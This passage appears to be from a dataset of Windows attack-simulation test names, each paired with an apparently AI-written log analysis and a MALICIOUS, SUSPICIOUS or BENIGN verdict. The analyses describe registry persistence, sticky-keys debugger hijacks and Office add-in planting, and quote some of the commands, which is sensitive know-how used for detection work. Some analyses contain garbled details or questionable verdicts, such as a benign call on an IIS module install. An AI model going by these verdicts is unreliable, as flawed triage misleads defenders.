4. **Threat Hunting**: Conduct further threat hunting exercises that focus on the registry keys involved and process chains typical of lateral movement or data exfiltration operations.

If after further investigation, any unauthorized or malicious rationale is identified, suggest implementing necessary containment and remediation actions, including reviewing access policies and conducting a full environment security check."
GlobalFlags in Image File Execution Options,"After reviewing the provided Windows event logs, there is a notable sequence of events that indicates potential malicious activity. Here’s a breakdown of the findings:

### Suspicious and Anomalous Activities:
1. **Windows PowerShell Execution**
   - Several PowerShell events indicate the modification of registry entries related to the executable `whoami.exe` with specific settings that suggest an attempt to exploit 'Silent Process Exit':
     - The PowerShell script adds properties like `GlobalFlag` and `ReportingMode`, and configures `MonitorProcess` to execute `cmd.exe /c calc.exe` when `whoami.exe` is run.
   - This suggests an attempt to trigger an unintended execution of the calculator app, through what potentially looks like a technique used to gain unauthorized code execution via registry modifications.

2. **Process Execution and Command-Line Arguments**
   - Execution logs show PowerShell being used to modify registry settings, and subsequent process creations for `whoami.exe`, which seems to check user identity, possibly as a precursor or part of a persistence or privilege escalation tactic.
   - Several executables run with high integrity levels, indicative of attempts to leverage elevated permissions.

3. **Sysmon Logs:**
   - Multiple virtual consoles (`conhost.exe`) started from suspicious parent processes like `whoami.exe` and PowerShell, further supporting the theory of command execution attempts.
   - The presence of `wevtutil.exe` executions could suggest event log exports, trying to cover tracks or pivoting actions by a potential attacker.

### Assessment
The evidence of PowerShell scripts running to modify critical registry edges and spawn non-standard processes suggests the system might have been the target of a living-off-the-land attack (where legitimate Windows tools and features are manipulated for malicious purposes). Particularly, the registry modifications with PowerShell scripting fall into potential tactics often associated with malware or attackers looking to bypass traditional security controls.

### Recommendation:
- **Immediate Investigation**: Priority should be given to understanding the origin and intent of the PowerShell scripts. Determine if these scripts were an authorized administrative action or indicate unauthorized access or compromise.
- **Malware Scan**: Conduct a thorough malware scan and integrity checks on `whoami.exe` and the other involved executables.
- **Registry Inspection**: Review and potentially revert unauthorized changes in the registry, particularly under paths influenced by the PowerShell script.
- **Incident Response**: As these actions suggest High typical activity for a compromised system, engage incident response procedures to assess, contain, and remediate.

### Resolution
- **MALICIOUS**: The activities captured in these logs, particularly the PowerShell registry modifications to affect the behavior of system executables, align with known malicious methodologies and warrant further investigation."
Office Application Startup Test Persistence (HKCU),"Upon reviewing the provided Windows event logs, the following observations and evaluations were made in the context of potential suspicious or malicious activity:

1. **PowerShell Logs:**
   - A PowerShell script is executed that attempts to determine the bitness of Microsoft Word installed on the system. It then modifies the Windows Registry to add a custom registry value pointing to a DLL file located in a user's temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.002\bin\officetest_x64.dll` or `officetest_x86.dll`).
   - The script stops and starts the `WinWord` process. This behavior could be leveraging PowerShell for persistence or payload delivery using Office applications, which is a common technique used by attackers to achieve persistence or execute malicious code.

2. **Sysmon Logs:**
   - Multiple instances of PowerShell (`powershell.exe`) and Windows services including `wevtutil.exe` and `conhost.exe` are executed, which is consistent with typical Windows operations. However, the frequent use of these processes in conjunction with PowerShell warrants closer scrutiny.
   - Notable processes: 
     - `PowerShell.exe` with suspicious command-line usage, as detailed in the PowerShell logs.
     - `sppsvc.exe`, `conhost.exe`, and `wevtutil.exe` are executed, but without additional unusual command-line arguments, they appear normal on their own.

3. **Potential Indicators of Malicious Activity:**
   - The resizing of the registry in a user’s temporary folder hinting at potential DLL sideloading or usage of malicious DLLs.
   - The script conditions embedded in the PowerShell script indicate potential checks and operations that might not be standard operations for an organization’s environment, especially if these DLLs are not company-sanctioned.
   - Usage of `New-Object -COMObject ""Word.Application""` which can be a vector for COM scriptlet hijacking, a common attack vector.

4. **Security and Windows System Logs:**
   - These logs are empty, providing no additional context or alerts that might have been triggered by other suspicious system or security events during the same period.

**Assessment and Resolution:**
- The activity observed in the PowerShell scripts is aligned with potential malicious activity, potentially indicating an attempt to execute or load malicious code using the Microsoft Office application as a launching point.
- There’s a risk of credential or data compromise should these scripts be part of a larger attack strategy.
- **Resolution: MALICIOUS** - The combination of script execution altering registry entries, especially targeting Office applications, aligns with known methods of malware persistence and execution. Immediate attention is required.

**Guidance:**
- Perform a thorough review of the user account activity `SERVER002\\admin_test` and verify any other associated systems and access activity.
- Examine any downloaded or installed software on the system for potential rogue or malicious applications or DLLs within the specified temporary paths.
- Consider temporarily suspending the user account activity until a full investigation is completed to prevent further potential compromise.
- Deploy advanced threat detection mechanisms or EDR solutions to monitor for further suspicious activities and take preemptive measures based on any identified malicious activity patterns."
Install IIS Module using AppCmd.exe,"The log entries provided encompass data from various sources including the Application log, Sysmon log, and involve activities primarily on the server `Server002`. Here is an analysis of the entries:

1. **Application Log Analysis**: 
   - The log entries for the `edgeupdate` service indicate it was stopped twice in quick succession. This could point to normal service behavior or scheduled tasks.

2. **Sysmon Log Analysis**:
   - We observe a series of executions involving standard Windows utilities like `powershell.exe`, `conhost.exe`, `cmd.exe`, and `wevtutil.exe` by the user `SERVER002\admin_test`.
   - The processes are run under a high integrity level which is typical for administrative tasks but can also facilitate privilege misuse.
   - There are numerous entries showing the execution of `MicrosoftEdgeUpdate.exe` with various command-line operations. These entries seem to relate to software update routines, which align with legitimate activity typically initiated by the system for automatic updates.
   - The repeated pattern of executions without notable anomalies seems standard for a legitimate software update process.

3. **Suspicious Behavior Assessment**:
   - The series of activities related to `MicrosoftEdgeUpdate.exe` appear to be consistent with a legitimate update process, albeit executed multiple times under `NT AUTHORITY\SYSTEM`.
   - The execution of commands like `whoami`, `hostname`, and `cmd.exe` using high privilege can be normal under certain circumstances, especially if administrative audits or scheduled tasks are being carried out.

4. **Overall Assessment**:
   - Given the logs, the behavior appears to coincide with software update activities and usual administrative operations. No explicit signs of malicious activities such as unusual command arguments, code injection attempts, or unknown processes are evident.

5. **Resolution**: 
   - **BENIGN**: The actions described are consistent with legitimate software updates and routine system maintenance behaviors under administrative oversight. Therefore, based on the current evidence, the observed activities are benign and present no immediate security threat.

**Guidance**: While the logs indicate benign activity, it is advisable to ensure that all software updates are verified and originate from trusted sources. Continuous monitoring for any deviations from established baselines remains crucial to swiftly identify and respond to potential threats."
Attaches Command Prompt as a Debugger to a List of Target Processes,"Upon analyzing the provided Windows event logs, a few elements stand out that warrant further discussion:

1. **PowerShell Script Execution:**
   - The **PowerShell logs** show execution of a script that modifies the registry to set debugging parameters for several accessibility tools (`osk.exe`, `sethc.exe`, `utilman.exe`, `magnify.exe`, etc.) to launch `cmd.exe`. This indicates a potential attempt to perform an unauthorized privilege escalation known as ""Sticky Keys"" attack. This could allow an attacker to gain administrative access to the system if these applications are triggered on the login screen.

2. **Sysmon Logs:**
   - An event shows `PowerShell.exe` being used with a suspicious command line executing code modifying registry keys under `HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`, a technique used in persistence or privilege escalation attacks.
   - The execution of `wevtutil.exe` to export logs (`epl`) indicates potential log tampering, which might be used by an attacker to avoid detection by security monitoring tools.

3. **Security Logs:**
   - Multiple event logs (Event ID: 4672) show audit entries for successful privilege escalation using high-level privileges by `NT AUTHORITY\SYSTEM`.

4. **Application Log:**
   - The repeated stopping and restarting of the `edgeupdate` service doesn't necessarily indicate malicious activity on its own, as it might be standard behavior for updates. However, in the context of the identified suspicious activities, these should be reviewed further.

**Assessment:**
- The PowerShell activity modifying system registry settings for accessibility executables to point to `cmd.exe` is particularly concerning and aligns with typical malicious activity aiming for privilege escalation.
- The presence of these activities could indicate a compromise or at least an attempt at malicious activity by an insider or external threat actor.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- **Immediate Actions:**
  - Disconnect the affected machine (Server002) from the network to prevent potential lateral movement or data exfiltration.
  - Perform a full incident response process including forensic investigation of the machine and potentially other assets.
  
- **Long-term Actions:**
  - Review security policies and system configurations to ensure all best practices are followed, particularly concerning remote access and PowerShell script execution.
  - Reinforce monitoring of sensitive accounts and configuration changes, particularly those involving system-level processes.
  - Implement additional user awareness training to recognize and handle suspicious activities.
  
- **Review and Mitigation:**
  - Investigate associated user accounts for unauthorized access or usage, particularly focusing on `SERVER002\admin_test`.
  - Check all instances or attempts of registry changes, especially those involving debugger-like behavior changes.
  - Ensure that endpoint protection systems and network defenses are fully operational and updated, with special emphasis on detecting command-line and script-based attacks.  

Swift action is crucial to mitigate potential damages and prevent further spread or exploitation within the network."
Azure AD - Create a new user,"### Detailed Analysis:

#### Suspicious or Anomalous Behavior
1. **PowerShell Activity**
   - Multiple PowerShell logs indicate a potentially automated script execution involving Azure AD: `""powershell.exe & {Connect-AzureAD ...}`. This script contains sensitive information such as a password that is embedded within the script command-line arguments. The action being performed is `New-AzureADUser`, which is used to create a new user in Azure AD with an associated password. Such activity should be tightly monitored and verified for legitimacy. The fact that complex scripts with plain-text passwords are being run raises suspicion and concerns over security hygiene.

2. **High Integrity Level Processes**
   - The PowerShell process and several others, such as `wevtutil.exe` and `WindowsPowerShell.exe`, are executing under a high integrity level as `SERVER002\admin_test`. This signifies that the user has administrative rights, abetting potential privilege abuse especially if these scripts or binaries are not part of standard operations.

3. **Repeated Usage of `wevtutil.exe`**
   - Multiple instances of `wevtutil.exe` are initiated by the `admin_test` user. This utility interacts with the Windows Event Log system and is commonly used by attackers to clear logs or exfiltrate them without leaving traces. The abnormal frequency and timing warrant further scrutiny.

4. **Failed Credential Access Events (EventID: 5379)**
   - There are numerous security log entries with EventID 5379 indicating failed attempts to retrieve credentials associated with a ""MicrosoftAccount"". This behavior is unusual and could imply an unauthorized attempt at credential access on the system.

5. **Service Privileges (EventID: 4672)**
   - Events show SYSTEM user gaining privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc. While SYSTEM typically does have these privileges, seeing them occur might suggest a misconfiguration or exploitation scenario, especially when combined with suspicious script activity.

#### Potential Indicators of Compromise
- **Credential Dumping Attempts**: The repeated EventID 5379 attempts with return code `3221226021` suggest potential credential dumping or account mismanagement.
- **Unusual Script Execution**: The PowerShell script with hardcoded sensitive credentials, coupled with the capability to create new users (`New-AzureADUser`), indicates possible automation of malicious account creation or misconfiguration.
- **Extensive Log Access**: The `wevtutil.exe` usage during this period may align with a strategy to hide traces by manipulating Windows Event Logs.

### Assessment and Resolution:

- **Resolution: SUSPICIOUS**
  - The presence of embedded credentials in PowerShell scripts, excessive use of event log utilities by an administrator, and failed credential access attempts are significant indicators of suspicious behavior.
  - Further investigation is required to trace the origins of the PowerShell scripts, verify if `admin_test` account activity aligns with authorized operational procedures, and determine any unauthorized access or privilege escalation attempts.

### Guidance on How to Proceed

1. **Investigate PowerShell Script Source**: Verify the origin of the PowerShell script and check whether this operation was scheduled as part of legitimate administrative tasks.
2. **Credential Audit**: Conduct an audit of account activities, especially focusing on the `admin_test` user and attempted credential access.
3. **Enhance Monitoring**: Implement or enhance monitoring capabilities specifically for PowerShell and administrative command usage.
4. **Review Logs and Permissions**: Review logs for other potentially related anomalies outside of the provided entries, particularly examining any other accounts with elevated permissions.
5. **Security Controls**: Strengthen access control and conduct a comprehensive security review to prevent script-based attacks and misuse of administrative privileges.

These steps should help either confirm or rule out malicious intent behind the observed activities and reinforce the host's security posture."
Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM),"### Detailed Analysis:

1. **Unusual PowerShell Activity**:
   - The `Windows PowerShell` log indicates PowerShell execution with the following command: 
     ```
     Copy ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.006\\bin\\Addins\\PptVBAaddin.ppam"" ""$env:APPDATA\\Microsoft\\Addins\\notepad.ppam"", $ver = (New-Object -COMObject ""PowerPoint.Application"").version, etc.
     ```
     This script is attempting to copy an add-in (PptVBAaddin.ppam) to a user's Microsoft Office Addins directory and create registry entries related to PowerPoint AddIns. It also attempts to manipulate the PowerPoint process by stopping and starting it.

   - This activity is suspicious because it involves:
     - Copying files to APPDATA which could be used to plant malicious payloads or persistence mechanisms.
     - Modifying the registry to auto-load an add-in could potentially allow malicious code to run every time PowerPoint starts, indicating persistence strategies.
     - The stopped PowerPoint process may indicate efforts to evade execution monitoring or to force the user to restart the application with malicious capabilities.

     The attempts to access or modify these paths, particularly in the context of Microsoft Office add-ins, could be indicative of an attempt to install a malicious add-in that could execute arbitrary code under the context of an office application, which is a common vector for attacks exploiting office vulnerabilities.

2. **Sysmon Logs**:
   - Multiple instances of PowerShell execution and commands involving wevtutil.exe and whoami.exe are observed.
   - The use of `wevtutil.exe` could be an attempt to clear or manipulate Windows event logs to cover tracks, which is a common tactic used by attackers post-exploitation.
   - The execution of `whoami.exe` and other such commands in the context of an administrative user without a direct interactive session could indicate command execution without user initiation.

3. **Edge Update Process**:
   - There are numerous entries regarding the execution of MicrosoftEdgeUpdate.exe processes:
     - This appears to be regular Edge update activities, but the fact that these activities coincide with the suspicious PowerShell activities mentioned above is worth noting.
   - Further scrutiny of this activity in terms of network connections, and executed binaries might be needed to rule out piggybacking attacks, although they generally seem typical for legitimate updates.

4. **Indicators**:
   - The timing and nature of the PowerShell script execution, combined with the use of utility tools that could aid in persistence and evasion, should be flagged as highly suspicious.
   - Furthermore, the attempt to stop and start PowerPoint can be a method to hide malicious behavior under the guise of normal software operations.

### Assessment:

Based on the logs, the PowerShell activity, coupled with attempts to modify the registry and manipulate PowerPoint processes, alongside entries in Sysmon that indicate processes tied to potential log manipulation or reconnaissance, signal behavior that is inconsistent with normal administrative tasks. Such scripting activity near synced log modifications could point towards an active threat or a test of malicious capabilities.

### Conclusion:

**Resolution: SUSPICIOUS**

This activity does not appear benign while combining several tactics known to be used in malicious attacks, warranting a deeper investigation. Further checks on the integrity of Office applications and defensive measures must be taken:

1. **Conduct a thorough integrity check** on office-related processes, add-ins, and registered DLLs.
2. **Audit registry changes** specifically for modifications related to Office applications.
3. **Investigate network connections** during the PowerShell execution to detect potential data exfiltration or command-and-control communication.
4. **Ensure systems are fully patched and use additional endpoint protection measures** to detect such behaviors.
5. **Validate if the PowerShell commands were part of known administrative tasks**, if not, contain and investigate the account and machine for further malicious indicators.

### Guidance:

- Perform endpoint isolation if further corroborative evidence of malicious activity is found during ongoing investigation.
- Use advanced EDR solutions, if available, to backtrace processes for any interactive sessions possibly pointing to exploit origin.
- Consider this a potential penetration test if authorized and known beforehand by your red team; otherwise, treat it as an active incident."
Install IIS Module using PowerShell Cmdlet New-WebGlobalModule,"Upon reviewing the provided Windows event logs, here is a detailed analysis with focus on the main points:

### **1. Windows PowerShell Log Analysis:**
- The logs show the execution of PowerShell with a specific command:
  - `powershell.exe & {New-WebGlobalModule -Name DefaultDocumentModule_file -Image %windir%\\system32\\inetsrv\\defdoc.dll}`
- The execution of PowerShell commands with script block can be an indicator of administrative tasks or automated scripts. However, the usage of `New-WebGlobalModule` and loading a DLL (`defdoc.dll` commonly resides in the `system32\\inetsrv` directory concerning IIS services) can be suspicious if IIS is not typically managed via command line.

### **2. Application Log Analysis:**
- Logs show routine activities like the stopping of the `edgeupdate` service, which could be part of routine updates. This is usually benign unless there was no expectation of updates at this time.

### **3. Sysmon Log Analysis:**
- The Sysmon logs show multiple processes executed around the same time:
  - Notable is the execution of `powershell.exe` with the same command noted in the PowerShell log.
  - Processes like `wevtutil.exe` and `connector.exe` are often used for administrative tasks, managing event logs, and console inputs but can be used maliciously if executed unexpectedly.
  - Several instances of Microsoft Edge update processes (`MicrosoftEdgeUpdate.exe`) running appear routine due to version updates. No evidence of unusual paths or filenames tied to these processes.

### **4. Potential Indicators:**
- **PowerShell Command:** The use of PowerShell in conjunction with module management and a DLL file is worth further investigation if these operations are not standard procedure for IIS management on the server.
- **Repeated `wevtutil.exe` Usage:** Could be suspicious for tampering with event logs if unexpected.
- **Unusual Execution Contexts or Times:** None found in a cursory glance, but it remains critical to check if these correspond to expected administrative time frames.

### **Resolution: SUSPICIOUS**
Based on:
- The nature of command executed in PowerShell suggests that it could be part of an administrative script or configuration task, but if unexpected, it could contribute to a potential indicator of compromise.
- Repeated execution of event log management utilities in conjunction with administrative tools, if unexpected, should be reviewed.
  
### **Guidance:**
- **Verify with Admins:** Confirm with system administrators if any changes or scripts involving PowerShell and IIS were supposed to be executed around the time these logs were created.
- **Investigate Host**: Check if there are any other related security alerts or logs indicating unusual activity around the same timeframe.
- **Confirm Edge Updates**: Validate that the Edge Update activities align with expected system update schedules.
- **Monitor and Audit**: Increase monitoring on `powershell.exe` executions and related system changes to capture future unexpected behaviors.

Given these conditions, the logs indicate SUSPICIOUS activity that warrants deeper investigation to rule out or confirm any potential malicious activity."
